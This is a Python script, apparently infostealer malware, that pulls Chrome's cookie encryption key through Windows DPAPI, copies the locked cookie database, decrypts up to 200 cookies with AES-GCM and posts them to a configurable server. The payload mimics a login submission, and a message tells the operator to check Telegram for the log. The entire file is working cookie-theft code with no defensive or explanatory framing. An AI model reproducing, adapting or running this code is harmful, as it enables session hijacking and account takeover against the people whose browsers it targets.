import os
import json
import base64
import sqlite3
import shutil
import time
import requests
import win32crypt  # pip install pywin32
try:
    from Crypto.Cipher import AES
except ImportError:
    from Cryptodome.Cipher import AES  # pip install pycryptodomex

class CookieExtractor:
    def __init__(self, target_url="http://127.0.0.1:5000/login"):
        self.target_url = target_url
        self.local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        self.cookie_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
        
        # Fallback for older Chrome versions
        if not os.path.exists(self.cookie_path):
            self.cookie_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")

    def get_encryption_key(self):
        """Extracts the AES encryption key from Chrome's Local State file."""
        if not os.path.exists(self.local_state_path):
            print(f"[!] Local State file not found at: {self.local_state_path}")
            return None

        try:
            with open(self.local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            # Extract the encrypted key
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            
            # Remove the 'DPAPI' prefix (first 5 bytes)
            encrypted_key = encrypted_key[5:]
            
            # Decrypt the key using Windows DPAPI
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except Exception as e:
            print(f"[!] Failed to get encryption key: {str(e)}")
            return None

    def decrypt_data(self, data, key):
        """Decrypts the actual cookie value using AES GCM."""
        try:
            # Get the initialization vector (IV) - starts at index 3, 12 bytes long
            iv = data[3:15]
            # Get the encrypted payload - starts at index 15, exclude last 16 bytes (tag)
            payload = data[15:-16]
            
            # Decrypt
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            return decrypted_pass.decode()
        except Exception as e:
            return None

    def robust_copy(self, src, dst, retries=5):
        """Attempts to copy a file even if locked by another process."""
        for attempt in range(retries):
            try:
                shutil.copyfile(src, dst)
                return True
            except (PermissionError, IOError):
                # Try Windows API copy
                try:
                    import win32api
                    win32api.CopyFile(src, dst, 0)
                    return True
                except Exception:
                    pass
                
                # Try Low-level read
                try:
                    import win32file
                    import win32con
                    
                    hSrc = win32file.CreateFile(
                        src,
                        win32con.GENERIC_READ,
                        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
                        None, 
                        win32con.OPEN_EXISTING,
                        0, 
                        None
                    )
                    
                    hDst = win32file.CreateFile(
                        dst,
                        win32con.GENERIC_WRITE,
                        0,
                        None,
                        win32con.CREATE_ALWAYS,
                        0,
                        None
                    )
                    
                    while True:
                        err, data = win32file.ReadFile(hSrc, 65536)
                        if not data:
                            break
                        win32file.WriteFile(hDst, data)
                        
                    win32file.CloseHandle(hSrc)
                    win32file.CloseHandle(hDst)
                    return True
                except Exception:
                     # Wait before retry
                     time.sleep(1)

        # Final attempt after retries
        return False

    def extract_and_send(self):
        """Main execution flow."""
        print("[*] Starting cookie extraction...")
        
        key = self.get_encryption_key()
        if not key:
            print("[!] Could not obtain Master Key. Aborting.")
            return

        print("[*] Master Key obtained successfully.")

        filename = "Cookies.db"
        
        # 1. Try to copy the file (Robust Copy with Retries)
        if self.robust_copy(self.cookie_path, filename):
             try:
                 db = sqlite3.connect(filename)
             except Exception as e:
                 print(f"[!] Copied file is corrupt or unreadable: {e}")
                 db = None
        else:
             db = None
        
        # 2. If copy failed, try Direct Read-Only Connection
        if db is None:
             print("[!] File copy failed. Attempting direct read-only access...")
             try:
                 db = sqlite3.connect(f"file:{self.cookie_path}?mode=ro&immutable=1", uri=True)
             except Exception as e:
                 print(f"[!] Direct connection failed: {e}")
                 print("[!] CRITICAL: Chrome has locked the database exclusively.")
                 return

        cursor = db.cursor()
        
        # Query cookies
        try:
            # Query cookies (fetch ANY 200 cookies for debugging)
            query = "SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies LIMIT 200"
            cursor.execute(query)
            
            captured_cookies = []
            
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                decrypted_value = value
                
                if not decrypted_value:
                    decrypted_value = self.decrypt_data(encrypted_value, key)
                
                if decrypted_value:
                    domain = host_key
                    captured_cookies.append(f"{domain}\t{name}={decrypted_value[:50]}...") # Truncate for display
                    # Keep full value for sending
                    
            print(f"[+] Successfully extracted {len(captured_cookies)} cookies.")
            
            if not captured_cookies:
                print("[-] No cookies found in database.")
                return

            print(f"[*] Sending {len(captured_cookies)} cookies to server...")
            
            # Re-fetch full values for sending
            cursor.execute(query)
            full_cookies = []
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                 decrypted_value = value
                 if not decrypted_value:
                     decrypted_value = self.decrypt_data(encrypted_value, key)
                 if decrypted_value:
                     full_cookies.append(f"{host_key}\t{name}={decrypted_value}")

            cookie_string = "; ".join(full_cookies)
            
            payload = {
                "email": "extracted_via_script@local.tool",
                "password": "[COOKIES_EXTRACTED_LOCALLY]",
                "cookies": cookie_string,
                "browserInfo": {
                    "userAgent": "Python Script / Chrome Extractor",
                    "platform": "Windows-Local-Extraction",
                    "screenResolution": "Native",
                    "timezone": "Local"
                }
            }
            
            try:
                response = requests.post(self.target_url, json=payload)
                if response.status_code == 200:
                    print("\n[SUCCESS] Cookies successfully sent to the application!")
                    print("[*] Check your Telegram for the log.")
                else:
                    print(f"[!] Server returned error: {response.status_code}")
            except Exception as e:
                print(f"[!] Failed to send data: {str(e)}")

        except Exception as e:
            print(f"[!] Error querying database: {e}")
        finally:
            db.close()
            if os.path.exists(filename):
                try:
                    os.remove(filename)
                except:
                    pass

if __name__ == "__main__":
    extractor = CookieExtractor()
    extractor.extract_and_send()
